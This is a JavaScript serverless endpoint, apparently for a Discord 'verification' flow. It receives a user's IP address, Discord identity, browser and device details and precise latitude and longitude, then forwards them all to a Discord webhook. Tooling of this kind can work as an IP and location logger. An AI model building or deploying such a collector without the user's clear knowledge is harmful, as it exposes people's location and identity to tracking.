import axios from 'axios';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const {
    ip,
    code,
    discordUserId,
    discordUsername,
    userAgent,
    language,
    platform,
    screenResolution,
    timezone,
    timestamp,
    latitude,
    longitude
  } = req.body;

  const content = `**New Verification Data**\n` +
                  `IP: ${ip}\n` +
                  `Discord: ${discordUsername} (${discordUserId})\n` +
                  `Lang: ${language} | TZ: ${timezone}\n` +
                  `Platform: ${platform} | Screen: ${screenResolution}\n` +
                  `Lat: ${latitude}, Lon: ${longitude}\n` +
                  `User Agent: ${userAgent}\n` +
                  `Time: ${timestamp}`;

  try {
    await axios.post(process.env.DISCORD_WEBHOOK, {
      content
    });
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Webhook send failed:', err.message);
    return res.status(500).json({ error: 'Webhook failed' });
  }
}
